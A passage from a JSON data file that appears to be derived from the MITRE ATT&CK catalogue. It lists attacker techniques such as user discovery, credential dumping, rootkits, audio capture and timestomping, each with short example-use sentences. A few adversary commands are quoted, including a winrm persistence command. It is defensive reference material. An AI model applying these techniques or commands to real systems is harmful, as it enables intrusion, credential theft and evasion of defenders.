      "can obtain the id of a logged in user.",
      "has used tools to gather information about users.",
      "has used the quser command to show currently logged on users.",
      "has used whoami commands to identify system owners.",
      "collects the victims username.",
      "can gather system owner information including user and administrator privileges.",
      "will run the whoami command to gather system information and return this to the command and control server.",
      "collected the victim username and whether it was running as admin then sent the information to its C2 server.",
      "can use `whoami` to obtain the username from a compromised host.",
      "can use the Windows user name to create a unique identification for infected users and systems.",
      "has executed the PowerShell command `Get-EventLog security -instanceid 4624` to identify associated user and computer account names.",
      "opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain.",
      "has the ability to distinguish between a standard user and an administrator on a compromised host.",
      "has used a malicious DLL to collect the username from compromised hosts.",
      "has run the whoami command and has a built-in command to identify the user logged in.",
      "has the ability to identify the user on a compromised host.",
      "has been used to run the whoami command on the system.",
      "used whoami and query user to obtain information about the victim user.",
      "will attempt to enumerate the username of the victim.",
      "has used whoami to identify the local user and their privileges.",
      "executes the whoami on the victims machine.",
      "has executed whoami commands including using the WMIEXEC utility to execute this on remote machines.",
      "A Linux version of  checks if the victim user ID is anything other than zero (normally used for root) and the malware will not execute if it does not have root privileges.  also gathers the username of the victim.",
      "uses NetUser-GetInfo to identify that it is running under an Admin account on the local system.",
      "enumerates and collects the username from the victims machine.",
      "can identify the username of the infected user.",
      "can obtain the username from the victim's machine.",
      "has run `whoami` on compromised machines to identify the current user.",
      "can obtain the name of the logged-in user on the victim.",
      "collects the victim username along with other account information (account type description full name SID and status).",
      "has the ability to collect the username on the infected host.",
      "can obtain a list of user accounts from a victim's machine.",
      "has probed victim machines with whoami and has collected the username from the machine.",
      "has the ability to identify the current user on the infected host.",
      "can check for blocklisted usernames on infected endpoints.",
      "has used malware to identify the username on a compromised host.",
      "can gather the username from the victims machine.",
      "has collected the username from the victim's machine.",
      "has used malware that can collect the victims username.",
      "can enumerate the username on a compromised host.",
      "can enumerate the account name on a targeted system.",
      "has the ability to identify the current username of an infected host.",
      "collected the username from a compromised host.",
      "has collected the user name from a compromised host using `GetUserNameA`.",
      "has discovered the username of the user running the backdoor.",
      "gathers the username from the victims machine.",
      "can gather data on the user of a compromised host.",
      "can retrieve the username from a targeted system.",
      "has a command to gather the username from the system.",
      "can gather a list of logged on users.",
      "has collected the username from a compromised host.",
      "can execute `getUsername` on compromised systems.",
      "During  the threat actors used  to enumerate hosts and gather username machine name and administrative permissions information.",
      "can enumerate the username on targeted hosts.",
      "can conduct basic network reconnaissance on the victim machine with `whoami` to get user details.",
      "can utilize `net use` commands to discover the user name on a compromised host.",
      "has used tools to identify the user of a compromised host.",
      "An  downloader uses the Windows command cmd.exe /C whoami to verify that it is running with the elevated privileges of System.",
      "deployed various malware such as YouieLoader that can perform system user discovery actions.",
      "includes modules for identifying local users and administrators on victim machines.",
      "can discover and send the username from a compromised host to C2.",
      "gathers information on the infected system owner and user.",
      "PowerShell scripts execute `whoami` to identify the executing user.",
      "can discover the username of an infected host.",
      "determines whether it is successfully running on a victim system by querying the running account information to determine if it is running in Session 0 indicating running with elevated privileges.",
      "has included the victim's computer name and username in C2 messages sent to actor-owned infrastructure.",
      "has used public tools and executed the PowerShell command `Get-EventLog security -instanceid 4624` to identify associated user and computer account names.",
      "gathers information on recently logged-in users on victim devices.",
      "gathers information on victim system users and usernames.",
      "can collect user information from the targeted host.",
      "can collect the user name from a compromised system which is used to create a unique victim identifier.",
      "can identify the username from a victim machine.",
      "can identify the compromised system's username which is then used as part of a unique identifier.",
      "has used `whoami.exe` to determine if the active user on a compromised system is an administrator."
    ],
    "id": "T1033",
    "name": "System Owner/User Discovery",
    "similar_words": [
      "System Owner/User Discovery"
    ]
  },
  "attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf": {
    "description": "The configurations for how applications run on macOS and OS X are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window  (Citation: Antiquated Mac Malware).",
    "example_uses": [],
    "id": "T1143",
    "name": "Hidden Window",
    "similar_words": [
      "Hidden Window"
    ]
  },
  "attack-pattern--04ef4356-8926-45e2-9441-634b6f3dcecb": {
    "description": "Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies (Citation: Writing Bad Malware for OSX). There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time (Citation: Malware Persistence on OS X).",
    "example_uses": [],
    "id": "T1161",
    "name": "LC_LOAD_DYLIB Addition",
    "similar_words": [
      "LC_LOAD_DYLIB Addition"
    ]
  },
  "attack-pattern--06780952-177c-4247-b978-79c357fb311f": {
    "description": "Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as /Library/Preferences (which execute with elevated privileges) and ~/Library/Preferences (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)",
    "example_uses": [],
    "id": "T1150",
    "name": "Plist Modification",
    "similar_words": [
      "Plist Modification"
    ]
  },
  "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953": {
    "description": "The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
    "example_uses": [],
    "id": "T1148",
    "name": "HISTCONTROL",
    "similar_words": [
      "HISTCONTROL"
    ]
  },
  "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22": {
    "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
    "example_uses": [
      "obtains Windows logon password details.",
      "stole domain credentials from Microsoft Active Directory Domain Controller and leveraged .",
      "leverages  and  to steal credentials.",
      "can gather hashed passwords by dumping SAM/SECURITY hive and gathers domain controller hashes from NTDS.",
      "leveraged  to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers.",
      "steals credentials stored in Web browsers by querying the sqlite database and leveraging the Windows Vault mechanism.",
      "dropped and executed SecretsDump and CrackMapExec, tools that can dump password hashes.",
      "leveraged the tool LaZagne for retrieving login and password information.",
      "can gather browser usernames and passwords.",
      "can obtain passwords from common browsers and FTP clients.",
      "executes  using PowerShell and can also perform pass-the-ticket and use Lazagne for harvesting credentials.",
      "has performed credential dumping with  and Lazagne.",
      "has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.",
      "harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).",
      "has used keyloggers that are also capable of dumping credentials.",
      "can perform credential dumping.",
      "contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences, Windows vault credential objects, or using .",
      "can dump process memory and extract clear-text credentials.",
      "has used various tools to perform credential dumping.",
      "has used credential dumping tools such as  and Lazagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.",
      "has used credential dumping tools.",
      "is capable of stealing Outlook passwords.",
      "has dumped credentials from victims. Specifically, the group has used the tool GET5 Penetrator to look for remote login and hard-coded credentials.",
      "uses credential dumpers such as  and  to extract cached credentials from Windows systems.",
      "can dump active logon session password hashes from the lsass process.",
      "has the capability to gather NTLM password information.",
      "can be used to dump credentials.",
      "can dump Windows password hashes and LSA secrets.",
      "has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.",
      "can extract cached password hashes from a system’s registry.",
      "collects user credentials, including passwords, for various programs and browsers, including popular instant messaging applications, Web browsers, and email clients. Windows account hashes, domain accounts, and LSA secrets are also collected, as are WLAN keys.",
      "dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.",
      "steals credentials from its victims.",
      "Some  samples contain a publicly available Web browser password recovery tool.",
      "collects credentials from Internet Explorer, Mozilla Firefox, Eudora, and several email clients.",
      "performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.",
      "is capable of stealing usernames and passwords from browsers on the victim machine.",
      "can recover hashed passwords.",
      "steals credentials from compromised hosts. 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  include ones associated with The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, Internet Explorer, Microsoft Outlook, WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).",
      "can dump credentials.",
      "can dump Windows password hashes.",
      "Password stealer and NTLM stealer modules in  harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication.  has also executed  for further victim penetration.",
      "A module in  collects passwords stored in applications installed on the victim.",
      "can dump the SAM database.",
      "can dump passwords and save them into \\ProgramData\\Mail\\MailAg\\pwds.txt.",
      "contains a module to steal credentials from Web browsers on the victim machine.",
      "steals credentials stored inside Internet Explorer.",
      "has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to dump credentials any time a domain, local user, or administrator logs in or changes a password.",
      "dumped the login data database from \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.",
      "malware gathers passwords from multiple sources, including Windows Credential Vault, Internet Explorer, Firefox, Chrome, and Outlook.",
      "used a signed credential-dumping tool to obtain victim account credentials.",
      "has used  for credential dumping, as well as Metasploit’s  NTDSGRAB module to obtain a copy of the victim's Active Directory database.",
      "conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.",
      "actors have used  and a modified version of  called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.",
      "has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument \"dig.\" The group has also used a tools to dump passwords from browsers.",
      "used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.",
      "regularly deploys both publicly available and custom password retrieval tools on victims.",
      "has been known to use credential dumping.",
      "has dumped credentials, including by using .",
      "has been known to dump credentials.",
      "has been known to dump credentials.",
      "has used different versions of Mimikatz to obtain credentials.",
      "has a plugin for credential harvesting.",
      "steals credentials from compromised hosts. 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  include ones associated many sources such as WinInet Credential Cache and Lightweight Directory Access Protocol (LDAP).",
      "conducts credential dumping on victims with a focus on obtaining credentials belonging to domain and database servers.",
      "has used a variety of credential dumping tools.",
      "used GetPassword_x64 to harvest credentials.",
      "regularly deploys both publicly available (ex: ) and custom password retrieval tools on victims.",
      "has used publicly available tools to dump password hashes including .",
      "gathers credential material from target systems such as SSH keys to facilitate access to victim environments.",
      "includes modules for dumping and capturing credentials from process memory.",
      "used tools such as  and  to dump credentials from victim systems."
    ],
    "id": "T1003",
    "name": "OS Credential Dumping",
    "similar_words": [
      "Credential Dumping",
      "OS Credential Dumping"
    ]
  },
  "attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65": {
    "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft DLL)",
    "example_uses": [
      "can load a DLL using the LoadLibrary API.",
      "creates a backdoor through which remote attackers can load and call DLL functions.",
      "can load DLLs into memory.",
      "calls LoadLibrary then executes exports from a DLL.",
      "uses the LoadLibraryExW() function to load additional modules.",
      "loads and executes functions from a DLL.",
      "had used AutoIt to load and execute the DLL payload.",
      "can load DLLs.",
      "dispatcher can execute additional plugins by loading the respective DLLs.",
      "loader can call the load() function to load the  dll into an Application Domain on a compromised AD FS server.",
      "uses dynamically linked shared libraries (`.so` files) to execute additional functionality using `dlopen()` and `dlsym()`.",
      "has loaded and executed DLLs in memory during runtime on a victim machine.",
      "can use `LoadLibrary` to attempt to execute GdiPlus.dll.",
      "has the ability to inject the LoadLibrary call template DLL into running processes.",
      "has used the DWriteCreateFactory() function to load additional modules.",
      "contains a function that calls LoadLibrary and GetProcAddress.",
      "For network communications  loads a dynamic library (`.dylib` file) using `dlopen()` and obtains a function pointer to execute within that shared library using `dlsym()`.",
      "has used call to LoadLibrary to load its installer.  loads its modules using reflective loading or custom shellcode.",
      "is executed through hooking the keyutils.so file used by legitimate versions of `OpenSSH` and `libcurl`.",
      "relied on the Java Instrumentation API and Javassist to dynamically modify Java code existing in memory.",
      "main executable and module `.dylib` binaries are loaded using a combination of `dlopen()` to load the library `_objc_getClass()` to retrieve the class definition and `_objec_msgSend()` to invoke/execute the specified method in the loaded class."
    ],
    "id": "T1129",
    "name": "Shared Modules",
    "similar_words": [
      "Execution through Module Load",
      "Shared Modules"
    ]
  },
  "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5": {
    "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
    "example_uses": [
      "can use the Volume Shadow Copy service to copy locked files such as `ntds.dit`.",
      "has created volume shadow copies of virtual domain controller disks to extract the `NTDS.dit` file.",
      "has executed the Windows-native `vssadmin` command to create volume shadow copies.",
      "During   accessed volume shadow copies through executing vssadmin in order to dump the NTDS.dit file."
    ],
    "id": "T1006",
    "name": "Direct Volume Access",
    "similar_words": [
      "File System Logical Offsets",
      "Direct Volume Access"
    ]
  },
  "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a": {
    "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
    "example_uses": [
      "One variant of  locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence."
    ],
    "id": "T1044",
    "name": "File System Permissions Weakness",
    "similar_words": [
      "File System Permissions Weakness"
    ]
  },
  "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0": {
    "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
    "example_uses": [
      "can sniff plaintext network credentials and use NBNS Spoofing to poison name services.",
      "is used to poison name services to gather hashes and credentials from systems within a local network."
    ],
    "id": "T1171",
    "name": "LLMNR/NBT-NS Poisoning",
    "similar_words": [
      "LLMNR/NBT-NS Poisoning and Relay"
    ]
  },
  "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b": {
    "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
    "example_uses": [
      "starts a rootkit from a malicious file dropped to disk.",
      "hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.",
      "is a kernel-mode rootkit.",
      "is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.",
      "is a rootkit used by .",
      "is a rootkit that hides certain operating system artifacts.",
      "used a rootkit to modify typical server functionality.",
      "has used user mode rootkit techniques to remain hidden on the system.",
      "deployed rootkits on Linux systems.",
      "has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.",
      "has included a rootkit to evade defenses.",
      "has used a kernel module rootkit to hide processes files executables and network artifacts from user space view.",
      "can install a rootkit to hide network connections from the host OS.",
      "has used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine.",
      "is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.",
      "hides from defenders by hooking libc function calls hiding artifacts that would reveal its presence such as the user account it creates to provide access and undermining strace a tool often used to identify malware.",
      "uses a Windows rootkit to mask its binaries and other relevant files.",
      "hooks or replaces multiple legitimate processes and other functions on victim devices.",
      "uses a rootkit to hook and implement functions on the system.",
      "has modified /etc/ld.so.preload to overwrite readdir() and readdir64().",
      "has used a UEFI (Unified Extensible Firmware Interface) rootkit known as .",
      "is a  that has been used by .",
      "has used a modified copy of the open-source userland rootkit Azazel named libxselinux.so to hide the malware's operations and network activity.",
      "is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.",
      "can use its kernel module to prevent its host components from being listed by the targeted system's OS and to mediate requests between user mode and concealed components.",
      "can include a rootkit to hide processes files and startup.",
      "has a module to use a rootkit on a system.",
      "acts as a user land rootkit using the SSH service.",
      "can hook both the crash dump process and the Autehntication Authorization and Accounting (AAA) functions on compromised machines to evade forensic analysis and authentication mechanisms.",
      "included hooking the `processHostScanReply()` function on victim Cisco ASA devices."
    ],
    "id": "T1014",
    "name": "Rootkit",
    "similar_words": [
      "Rootkit"
    ]
  },
  "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967": {
    "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
    "example_uses": [
      "has modules that are capable of capturing audio.",
      "can perform audio capture.",
      "can record sound using input audio devices.",
      "can record the sounds from microphones on a computer.",
      "is capable of performing audio captures.",
      "Get-MicrophoneAudio Exfiltration module can record system microphone audio.",
      "has used an audio capturing utility known as SOUNDWAVE that captures microphone input.",
      "can record sound with the microphone.",
      "has the capability to capture audio from a victim machine.",
      "uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype.",
      "can record audio using any existing hardware recording devices.",
      "captured audio and sent it out to a C2 server.",
      "has an audio capture and eavesdropping module.",
      "has the ability to capture VoiceIP application audio on an infected host.",
      "has the ability to record audio from the compromised host.",
      "can capture audio feeds from the system.",
      "can perform audio surveillance using microphones.",
      "has the ability to record audio.",
      "captures audio from the computers microphone.",
      "has a feature to perform voice recording on the victims machine.",
      "has a plugin for microphone interception.",
      "can listen in to victims' conversations through the systems microphone.",
      "has a remote microphone monitoring capability.",
      "can capture microphone data from the victim's machine.",
      "can capture microphone recordings.",
      "can capture data from the systems microphone.",
      "can perform microphone recording.",
      "can load a module to leverage the LAME encoder and `mciSendStringW` to control and capture audio.",
      "has a plugin that is capable of recording audio using available input sound devices.",
      "can capture input and output audio streams from infected devices.",
      "uses Apple's built-in AVFoundation Framework library to capture and manage audio recordings then transform them to JSON blobs for exfiltration."
    ],
    "id": "T1123",
    "name": "Audio Capture",
    "similar_words": [
      "Audio Capture"
    ]
  },
  "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d": {
    "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.Access may also be gained through an exposed service that doesnt require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
    "example_uses": [
      "used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.",
      "regained access after eviction via the corporate VPN solution with a stolen VPN certificate, which they had extracted from a compromised host.",
      "uses remote services such as VPN, Citrix, or OWA to persist in an environment.",
      "has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.",
      "actors look for and use VPN profiles during an operation to access the network using external VPN services.",
      "actors leverage legitimate credentials to log into external remote services.",
      "has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments.  has also targeted exposed kubelets for Kubernetes environments.",
      "has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN).",
      "During  the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: `cscript //nologo C:\\Windows\\System32\\winrm.vbs set winrm/config/service@{EnableCompatibilityHttpsListener=true}`.",
      "attempts to gain access to the server via SSH.",
      "During  threat actors used compromised VPN accounts to gain access to victim systems.",
      "can establish an SSH connection from a compromised host to a server.",
      "has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network.  has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.",
      "was executed through an unsecure kubelet that allowed anonymous access to the victim environment.",
      "has leveraged legitimate remote management tools to maintain persistent access.",
      "compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.",
      "has gained access to internet-facing systems and applications including virtual private network (VPN) remote desktop protocol (RDP) and virtual desktop infrastructure (VDI) including Citrix.",
      "uses remote services such as VPN Citrix or OWA to persist in an environment.",
      "has used VPN services including SoftEther VPN to access and maintain persistence in victim environments.",
      "has gained access through VPNs including with compromised accounts and stolen VPN certificates.",
      "During the   installed a modified Dropbear SSH client as the backdoor to target systems.",
      "has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.",
      "has used compromised identities to access networks via VPNs and Citrix.",
      "During  the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.",
      "has used RDP to establish persistence.",
      "has used legitimate VPN Citrix or VNC credentials to maintain access to a victim environment.",
      "For the   used compromised identities to access networks via SSH VPNs and other remote access tools.",
      "actors look for and use VPN profiles during an operation to access the network using external VPN services.  has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.",
      "was executed in an Ubuntu container deployed via an open Docker daemon API.",
      "During   used Citrix and VPNs to persist in compromised environments.",
      "has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.",
      "has used legitimate credentials to login to an external VPN Citrix SSH and other remote services.",
      "During the  campaign  used VPN access to persist in the victim environment.",
      "has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.",
      "uses compromised VPN accounts for initial access to victim networks.",
      "has used  and a variety of commercial VPN services to route brute force authentication attempts.",
      "During  threat actors used stolen credentials to connect to the victim's network via VPN.",
      "was executed through an open Docker daemon API port.",
      "has used external remote services such as virtual private networks (VPN) to gain initial access.",
      "have used VPNs both for initial access to victim environments and for persistence within them following compromise.",
      "has used VPNs to connect to victim environments and enable post-exploitation actions.",
      "has used Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.",
      "has leveraged access to internet-facing remote services to compromise and retain access to victim environments.",
      "has used external-facing SSH to achieve initial access to the IT environments of victim organizations.",
      "used WebVPN sessions commonly associated with Clientless SSLVPN services to communicate to compromised devices."
    ],
    "id": "T1133",
    "name": "External Remote Services",
    "similar_words": [
      "External Remote Services"
    ]
  },
  "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44": {
    "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
    "example_uses": [
      "is known to have the capability to overwrite the firmware on hard drives from some manufacturers."
    ],
    "id": "T1109",
    "name": "Component Firmware",
    "similar_words": [
      "Component Firmware"
    ]
  },
  "attack-pattern--128c55d3-aeba-469f-bd3e-c8996ab4112a": {
    "description": "Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)",
    "example_uses": [
      "modifies the time of a file as specified by the control server.",
      "samples were timestomped by the authors by setting the PE timestamps to all zero values.  also has a built-in command to modify file times.",
      "For early  versions, the compilation timestamp was faked.",
      "can modify file or directory timestamps.",
      "can timestomp files on victims using a Web shell.",
      "After creating a new service for persistence,  sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.",
      "performs timestomping of a CAB file it creates.",
      "has a command to timestop a file or directory.",
      "has used scheduled task raw XML with a backdated timestamp of June 2, 2016.",
      "Many  samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.",
      "has a command to set certain attributes such as creation/modification timestamps on files.",
      "modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.",
      "has a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.",
      "sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.",
      "will timestomp any files or payloads placed on a target machine to help them blend in.",
